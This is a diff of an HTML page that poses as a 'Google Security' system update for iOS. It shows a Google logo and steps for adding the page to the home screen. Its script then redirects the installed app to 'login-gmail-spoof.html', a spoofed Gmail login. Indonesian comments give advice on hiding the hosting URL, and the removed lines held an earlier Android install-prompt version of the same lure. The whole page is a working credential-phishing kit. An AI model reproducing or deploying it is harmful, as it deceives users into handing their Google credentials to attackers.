@@ -1,43 +1,53 @@
 <!doctype html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="manifest" href="manifest.json">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, viewport-fit=cover">
+    
+    <!-- Meta Tags Standalone iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Google Security">
+    
+    <link rel="apple-touch-icon" href="icon.png">
+
     <style>
-        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 15vh; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 85%; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; color: #000; text-align: center; margin: 0; }
+        .container { padding: 60px 20px; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        .step-card { background: #f2f2f7; padding: 20px; border-radius: 12px; text-align: left; margin-top: 20px; }
+        .footer-guide { position: fixed; bottom: 0; width: 100%; background: rgba(249, 249, 249, 0.9); border-top: 0.5px solid #d1d1d6; padding: 20px 0; font-size: 14px; }
     </style>
 </head>
 <body>
-    <h2 id="txt">Security Update Required</h2>
-    <p id="sub" style="color:#9aa0a6">Checking system compatibility...</p>
-    <button class="btn" id="go">ACTIVATE GOOGLE SECURITY</button>
 
 <script>
-if (window.matchMedia('(display-mode: standalone)').matches) {
-    window.location.href = "login-gmail-spoof.html";
+// Logic Standalone Mode
+if (window.navigator.standalone === true) {
+    // GUNAKAN RELATIVE PATH! 
+    // Jangan pake https://ologoligature.github.io/login-gmail-spoof.html
+    window.location.replace("login-gmail-spoof.html");
 }
-
-let p;
-navigator.serviceWorker.register('sw.js');
-
-window.addEventListener('beforeinstallprompt', (e) => {
-    e.preventDefault();
-    p = e;
-    document.getElementById('go').style.display = 'block';
-    document.getElementById('sub').innerText = "Compatibility Confirmed.";
-});
-
-document.getElementById('go').onclick = async () => {
-    if (p) {
-        p.prompt();
-        const { outcome } = await p.userChoice;
-        if (outcome === 'accepted') {
-            alert("Module Installed. Launch 'Google' from your Home Screen.");
-        }
-        p = null;
-    }
-};
 </script>
+
+<div class="container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+    <h2>System Security Update</h2>
+    <p>Required update for iOS 26.4.1 compliance.</p>
+    
+    <div class="step-card">
+        <b>How to install:</b>
+        <ol>
+            <li>Tap the <b>Share</b> button below.</li>
+            <li>Select <b>"Add to Home Screen"</b>.</li>
+            <li>Launch the installed app to verify.</li>
+        </ol>
+    </div>
+</div>
+
+<div class="footer-guide">
+    Tap <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/IOS_Share_Icon.svg/1200px-IOS_Share_Icon.svg.png" width="18"> then <b>Add to Home Screen</b>
+</div>
+
 </body>
 </html>
